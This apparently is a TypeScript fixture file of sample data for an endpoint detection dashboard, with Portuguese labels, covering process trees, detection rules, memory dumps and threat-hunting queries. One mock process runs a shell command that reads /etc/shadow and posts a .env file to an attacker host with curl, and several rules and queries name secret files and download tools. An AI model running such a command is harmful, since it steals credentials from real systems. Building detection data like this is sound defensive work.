import {
  EdrProcessNode,
  EdrBehavioralRule,
  EdrMemoryDumpAnalysis,
  EdrThreatHuntingQuery,
  EdrLiveTelemetry
} from '../types/edr';

export const INITIAL_PROCESS_TREES: EdrProcessNode[] = [
  {
    pid: 1402,
    ppid: 1,
    name: 'systemd',
    commandLine: '/sbin/init',
    hashSha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    user: 'root',
    integrityLevel: 'SYSTEM',
    startTime: 'Hoje, 00:01:00',
    threatScore: 0,
    actionTaken: 'ALLOW',
    networkConnections: [],
    fileModifications: [],
    children: [
      {
        pid: 2410,
        ppid: 1402,
        name: 'dockerd',
        commandLine: '/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock',
        hashSha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
        user: 'root',
        integrityLevel: 'SYSTEM',
        startTime: 'Hoje, 00:01:15',
        threatScore: 10,
        actionTaken: 'ALLOW',
        networkConnections: [
          { protocol: 'TCP', localPort: 2375, remoteAddress: '127.0.0.1', remotePort: 48210, state: 'ESTABLISHED' }
        ],
        fileModifications: ['/var/run/docker.pid'],
        children: [
          {
            pid: 5124,
            ppid: 2410,
            name: 'node (Payment Microservice)',
            commandLine: 'node dist/server.cjs --port 3000 --env production',
            hashSha256: '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8',
            user: 'app-runner',
            integrityLevel: 'MEDIUM',
            startTime: 'Hoje, 06:12:40',
            threatScore: 78,
            actionTaken: 'SUSPICIOUS',
            networkConnections: [
              { protocol: 'TCP', localPort: 3000, remoteAddress: '0.0.0.0', remotePort: 0, state: 'LISTENING' },
              { protocol: 'TCP', localPort: 48912, remoteAddress: '54.187.128.99', remotePort: 443, state: 'ESTABLISHED' }
            ],
            fileModifications: ['/tmp/payment-batch-trace.log', 'src/config/aws.ts'],
            children: [
              {
                pid: 7921,
                ppid: 5124,
                name: 'sh (Child Shell Spawned)',
                commandLine: '/bin/sh -c "cat /etc/shadow || curl -d @/app/.env https://attacker-dropzone.ru/log"',
                hashSha256: '4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a',
                user: 'app-runner',
                integrityLevel: 'MEDIUM',
                startTime: 'Hoje, 08:44:12',
                threatScore: 99,
                actionTaken: 'TERMINATE',
                networkConnections: [
                  { protocol: 'TCP', localPort: 52194, remoteAddress: '198.51.100.44', remotePort: 443, state: 'SYN_SENT' }
                ],
                fileModifications: ['/etc/passwd (READ_ATTEMPT)', '/app/.env (READ_ATTEMPT)'],
                children: []
              }
            ]
          }
        ]
      }
    ]
  }
];

export const INITIAL_BEHAVIORAL_RULES: EdrBehavioralRule[] = [
  {
    id: 'EDR-RULE-01',
    name: 'Spawn de Shell Interativo via Processo Web Node/Python/Java',
    mitreTactic: 'Execution',
    mitreTechnique: 'T1059.004 - Command and Scripting Interpreter: Unix Shell',
    severity: 'CRITICAL',
    triggerCondition: 'parent_process in ("node", "python3", "java", "nginx") and child_process in ("sh", "bash", "zsh", "cmd.exe", "powershell.exe")',
    autoRemediation: 'KILL_PROCESS_TREE',
    active: true,
    hitsCount: 14
  },
  {
    id: 'EDR-RULE-02',
    name: 'Tentativa de Acesso ou Leitura de Arquivo .env / Secrets Store',
    mitreTactic: 'Credential Access',
    mitreTechnique: 'T1552.001 - Credentials In Files',
    severity: 'HIGH',
    triggerCondition: 'file_read_path regex_match ("(\\.env|id_rsa|credentials|kube/config)") and process_name != "vault-agent"',
    autoRemediation: 'QUARANTINE_FILE',
    active: true,
    hitsCount: 39
  },
  {
    id: 'EDR-RULE-03',
    name: 'Process Hollowing & Manipulação de Memória RWX Não Alocada',
    mitreTactic: 'Defense Evasion',
    mitreTechnique: 'T1055.012 - Process Injection: Process Hollowing',
    severity: 'CRITICAL',
    triggerCondition: 'virtual_alloc_protection == "PAGE_EXECUTE_READWRITE" and caller_module != "trusted_runtime"',
    autoRemediation: 'ISOLATE_HOST',
    active: true,
    hitsCount: 2
  },
  {
    id: 'EDR-RULE-04',
    name: 'Conexão Reversa para Faixas de IPs de Tor Exit Nodes',
    mitreTactic: 'Exfiltration',
    mitreTechnique: 'T1071.001 - Application Layer Protocol: Web Protocols',
    severity: 'HIGH',
    triggerCondition: 'outbound_ip in tor_exit_nodes_feed or outbound_sni matches "\\.onion$"',
    autoRemediation: 'KILL_PROCESS_TREE',
    active: true,
    hitsCount: 7
  }
];

export const INITIAL_MEMORY_DUMPS: EdrMemoryDumpAnalysis[] = [
  {
    id: 'DUMP-9921',
    endpointHostname: 'prod-api-gateway-01',
    processName: 'node (dist/server.cjs)',
    pid: 5124,
    dumpSizeMb: 142.6,
    extractedSecretsCount: 4,
    yaraRuleMatches: ['SUSP_Suspicious_Eval_Pattern', 'CRED_Aws_Key_Format', 'UNSAFE_Deserialization_Signature'],
    injectedDlls: [],
    hollowedMemoryRegions: false,
    status: 'FLAGGED',
    timestamp: 'Hoje, 08:44:30'
  },
  {
    id: 'DUMP-9922',
    endpointHostname: 'worker-node-k8s-pod-7',
    processName: 'redis-server',
    pid: 3012,
    dumpSizeMb: 88.2,
    extractedSecretsCount: 0,
    yaraRuleMatches: [],
    injectedDlls: [],
    hollowedMemoryRegions: false,
    status: 'ANALYZED',
    timestamp: 'Hoje, 07:15:10'
  }
];

export const INITIAL_HUNTING_QUERIES: EdrThreatHuntingQuery[] = [
  {
    id: 'HUNT-01',
    title: 'Detecção de LOLBins (Living off the Land Binaries)',
    category: 'LOLBINS',
    queryText: 'EventType == "ProcessCreation" and ProcessName in ("certutil.exe", "bitsadmin.exe", "curl", "wget") and CommandLine contains "-O" or CommandLine contains "http"',
    matchesFound: 3,
    description: 'Localiza utilitários nativos do sistema operacional utilizados para baixar payloads secundários ou exfiltrar dados.'
  },
  {
    id: 'HUNT-02',
    title: 'Exfiltração DNS / Túneis ICMP Ocultos',
    category: 'REVERSE_SHELL',
    queryText: 'NetworkProtocol in ("DNS", "ICMP") and PayloadLength > 512 and RequestRatePerMinute > 120',
    matchesFound: 1,
    description: 'Identifica canais C2 de baixa frequência que encapsulam tráfego em consultas DNS longas ou pacotes Echo Request.'
  },
  {
    id: 'HUNT-03',
    title: 'Injeção de Bibliotecas / LD_PRELOAD Hijacking',
    category: 'PERSISTENCE',
    queryText: 'EnvironmentVariables contains "LD_PRELOAD" or EnvironmentVariables contains "DYLD_INSERT_LIBRARIES"',
    matchesFound: 0,
    description: 'Detecta interceptação de chamadas de sistema através de bibliotecas compartilhadas injetadas antes do carregamento normal.'
  }
];

export const INITIAL_EDR_TELEMETRY: EdrLiveTelemetry = {
  agentStatus: 'HEALTHY',
  kernelDriver: 'eBPF / Windows Filter Driver (Active)',
  totalMonitoredProcesses: 432,
  blockedAttacksToday: 23,
  quarantinedBinaries: 5,
  networkSensorsActive: 16,
  tamperProtection: 'ENABLED (Protected Process Light)'
};
